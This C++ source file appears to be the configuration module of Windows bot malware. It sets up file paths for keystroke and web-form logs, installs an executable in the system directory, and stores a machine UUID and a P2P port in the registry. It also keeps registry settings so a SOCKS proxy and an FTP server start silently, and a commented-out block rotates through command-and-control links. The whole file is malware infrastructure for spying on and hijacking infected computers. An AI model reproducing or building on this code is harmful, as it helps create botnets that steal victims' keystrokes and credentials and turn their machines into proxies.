#include <winsock2.h>
#include "socketwrapper.h"
#include "firewall.h"
#include "Iphlpapi.h"
#include "config.h"

namespace Config
{
	INT CurrentLink = -1;
	PCHAR LinkAddress = NULL;
	CHAR KeylogFilename[MAX_PATH];
	CHAR FormlogFilename[MAX_PATH];
	CHAR ExecuteFilename[MAX_PATH];
	CHAR UUID[UUID_LEN];
	CHAR UUIDAscii[UUID_LEN * 2];
	UCHAR SocksUserHash[16];
	UCHAR SocksPassHash[16];
	USHORT SocksPort;
	CHAR SocksVersion;
	HANDLE GlobalMutex = NULL;
#ifndef NO_FTP_SERVER
	UCHAR FTPUserHash[16];
	UCHAR FTPPassHash[16];
	USHORT FTPPort;
#endif
	Timeout StartTime;

	PCHAR GetUUID(VOID){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(!Reg.Exists(REG_UUID_VALUE)){
			for(UINT i = 0; i < UUID_LEN; i++)
				UUID[i] = rand_r(0, 0xff);
			Reg.SetBinary(REG_UUID_VALUE, UUID, UUID_LEN);
		}else{
			DWORD Size = UUID_LEN;
			Reg.GetBinary(REG_UUID_VALUE, UUID, &Size);
		}
		return UUID;
	}

	PCHAR GetUUIDAscii(VOID){
		PCHAR Buffer = Config::GetUUID();
		memset(UUIDAscii, NULL, UUID_LEN * 2);
		for(UINT i = 0; i < GetUUIDLen(); i++){
			CHAR Digit[3];
			sprintf(Digit, "%.2X", (BYTE)Buffer[i]);
			strcat(UUIDAscii, Digit);
		}
		return UUIDAscii;
	}

	UINT GetUUIDLen(VOID){
		return UUID_LEN;
	}

	ULONGLONG GetUptime(VOID){
		return StartTime.GetElapsedTime();
	}

	USHORT GetP2PPort(VOID){
		USHORT Port = 0;
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(!Reg.Exists(REG_P2PPORT_VALUE)){
			Reg.SetInt(REG_P2PPORT_VALUE, 0);
			Port = 0;
		}else{
			Port = Reg.GetInt(REG_P2PPORT_VALUE);
		}
		if(!Port)
		for(UINT i = 0; i < 5; i++){
			Socket TestSocket;
			TestSocket.Create(SOCK_STREAM);
			Port = rand_r(1025, 65535);
			if(TestSocket.Bind(Port) != SOCKET_ERROR){
				TestSocket.Disconnect(CLOSE_BOTH_HDL);
				Reg.SetInt(REG_P2PPORT_VALUE, Port);
				return Port;
			}
			TestSocket.Disconnect(CLOSE_BOTH_HDL);
		}
		return Port;
	}

	ULONG GetIPAddress(VOID){
		ULONG Addr = NULL;
		CHAR Hostname[256];
		gethostname(Hostname, sizeof(Hostname));
		PMIB_IPADDRTABLE IPAddrTable = new MIB_IPADDRTABLE;
		DWORD Size = sizeof(IPAddrTable);
		GetIpAddrTable(IPAddrTable, &Size, FALSE);
		delete[] IPAddrTable;
		IPAddrTable = (PMIB_IPADDRTABLE)new BYTE[Size];
		GetIpAddrTable(IPAddrTable, &Size, FALSE);
		for(UINT i = 0; i < IPAddrTable->dwNumEntries; i++){
			if(IPAddrTable->table[i].dwAddr == SocketFunction::GetAddr(Hostname)){
				Addr = IPAddrTable->table[i].dwAddr;
			}
		}
		delete[] IPAddrTable;
		return Addr;
	}

	ULONG GetSubnetMask(VOID){
		ULONG Addr = NULL;
		CHAR Hostname[256];
		gethostname(Hostname, sizeof(Hostname));
		PMIB_IPADDRTABLE IPAddrTable = new MIB_IPADDRTABLE;
		DWORD Size = sizeof(IPAddrTable);
		GetIpAddrTable(IPAddrTable, &Size, FALSE);
		delete[] IPAddrTable;
		IPAddrTable = (PMIB_IPADDRTABLE)new BYTE[Size];
		GetIpAddrTable(IPAddrTable, &Size, FALSE);
		for(UINT i = 0; i < IPAddrTable->dwNumEntries; i++){
			if(IPAddrTable->table[i].dwAddr == SocketFunction::GetAddr(Hostname)){
				Addr = IPAddrTable->table[i].dwMask;
			}
		}
		delete[] IPAddrTable;
		return Addr;
	}

	PCHAR GetKeylogFilename(VOID){
		SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_DEFAULT, KeylogFilename);
		//GetSystemDirectory((LPSTR)&SysDir, sizeof(SysDir));
		strcat(KeylogFilename, "\\");
		strcat(KeylogFilename, KEYLOG_FILENAME);
		return KeylogFilename;
	}

	PCHAR GetFormlogFilename(VOID){
		SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_DEFAULT, FormlogFilename);
		//GetSystemDirectory((LPSTR)&SysDir, sizeof(SysDir));
		strcat(FormlogFilename, "\\");
		strcat(FormlogFilename, FORMLOG_FILENAME);
		return FormlogFilename;
	}

	PCHAR GetExecuteFilename(VOID){
		GetSystemDirectory(ExecuteFilename, sizeof(ExecuteFilename));
		strcat(ExecuteFilename, "\\");
		strcat(ExecuteFilename, EXE_FILENAME);
		File File(ExecuteFilename);
		if(File.GetHandle() == INVALID_HANDLE_VALUE && GetLastError() == ERROR_ACCESS_DENIED){
			SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_DEFAULT, ExecuteFilename);
			strcat(ExecuteFilename, "\\");
			strcat(ExecuteFilename, EXE_FILENAME);
		}
		return ExecuteFilename;
	}

	VOID EnableSocksStartup(CHAR Version, USHORT Port, UCHAR UserHash[16], UCHAR PassHash[16]){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		Reg.SetInt(REG_SOCKSSTARTUP_VALUE, TRUE);
		Reg.SetInt(REG_SOCKSVERSION_VALUE, Version);
		Reg.SetInt(REG_SOCKSPORT_VALUE, Port);
		Reg.SetBinary(REG_SOCKSUSER_VALUE, (PCHAR)UserHash, 16);
		Reg.SetBinary(REG_SOCKSPASS_VALUE, (PCHAR)PassHash, 16);
	}

	VOID DisableSocksStartup(VOID){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		Reg.DeleteValue(REG_SOCKSSTARTUP_VALUE);
		Reg.DeleteValue(REG_SOCKSVERSION_VALUE);
		Reg.DeleteValue(REG_SOCKSPORT_VALUE);
		Reg.DeleteValue(REG_SOCKSUSER_VALUE);
		Reg.DeleteValue(REG_SOCKSPASS_VALUE);
	}

	BOOL LoadSocksStartupData(VOID){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(Reg.Exists(REG_SOCKSSTARTUP_VALUE)){
			if(Reg.GetInt(REG_SOCKSSTARTUP_VALUE)){
				SocksVersion = (CHAR)Reg.GetInt(REG_SOCKSVERSION_VALUE);
				SocksPort = (USHORT)Reg.GetInt(REG_SOCKSPORT_VALUE);
				DWORD Size = 16;
				Reg.GetBinary(REG_SOCKSUSER_VALUE, (PCHAR)SocksUserHash, &Size);
				Size = 16;
				Reg.GetBinary(REG_SOCKSPASS_VALUE, (PCHAR)SocksPassHash, &Size);
				return TRUE;
			}
		}
		return FALSE;
	}
	
#ifndef NO_FTP_SERVER
	VOID EnableFTPStartup(USHORT Port, UCHAR UserHash[16], UCHAR PassHash[16]){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		Reg.SetInt(REG_FTPSTARTUP_VALUE, TRUE);
		Reg.SetInt(REG_FTPPORT_VALUE, Port);
		Reg.SetBinary(REG_FTPUSER_VALUE, (PCHAR)UserHash, 16);
		Reg.SetBinary(REG_FTPPASS_VALUE, (PCHAR)PassHash, 16);
	}

	VOID DisableFTPStartup(VOID){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		Reg.DeleteValue(REG_FTPSTARTUP_VALUE);
		Reg.DeleteValue(REG_FTPPORT_VALUE);
		Reg.DeleteValue(REG_FTPUSER_VALUE);
		Reg.DeleteValue(REG_FTPPASS_VALUE);
	}

	BOOL LoadFTPStartupData(VOID){
		cRegistry Reg(HKEY_CURRENT_USER, REG_ROOT);
		if(Reg.Exists(REG_FTPSTARTUP_VALUE)){
			if(Reg.GetInt(REG_FTPSTARTUP_VALUE)){
				FTPPort = (USHORT)Reg.GetInt(REG_FTPPORT_VALUE);
				DWORD Size = 16;
				Reg.GetBinary(REG_FTPUSER_VALUE, (PCHAR)FTPUserHash, &Size);
				Size = 16;
				Reg.GetBinary(REG_FTPPASS_VALUE, (PCHAR)FTPPassHash, &Size);
				return TRUE;
			}
		}
		return FALSE;
	}
#endif

	/*VOID AddLink(PCHAR Host){
		cRegistry RegLinks(HKEY_CURRENT_USER, REG_LINKS);
		RemoveLink(Host);
		RegLinks.InsertMultiString(REG_LINKS_VALUE, Host);
		if(RegLinks.GetMultiStringElements(REG_LINKS) > MAX_LINKS)
			RegLinks.RemoveMultiString(REG_LINKS, 0);
	}

	VOID RemoveLink(PCHAR Host){
		cRegistry RegLinks(HKEY_CURRENT_USER, REG_LINKS);
		INT Index = RegLinks.MultiStringExists(REG_LINKS_VALUE, Host);
		if(Index >= 0)
			RegLinks.RemoveMultiString(REG_LINKS_VALUE, Index);
	}

	PCHAR GetLink(VOID){
		cRegistry RegLinks(HKEY_CURRENT_USER, REG_LINKS);
		INT Max = RegLinks.GetMultiStringElements(REG_LINKS_VALUE);
		if(!Max)
			return DEFAULT_LINK;
		if(CurrentLink < 0)
			CurrentLink = Max - 1;
		PCHAR Temp = RegLinks.GetMultiString(REG_LINKS_VALUE, CurrentLink);
		CurrentLink--;
		if(!LinkAddress)
			LinkAddress = new CHAR[256];
		if(Temp)
			strcpy(LinkAddress, Temp);
		return LinkAddress;
	}

	INT GetLinkCount(VOID){
		cRegistry RegLinks(HKEY_CURRENT_USER, REG_LINKS);
		return RegLinks.GetMultiStringElements(REG_LINKS_VALUE);
	}*/

}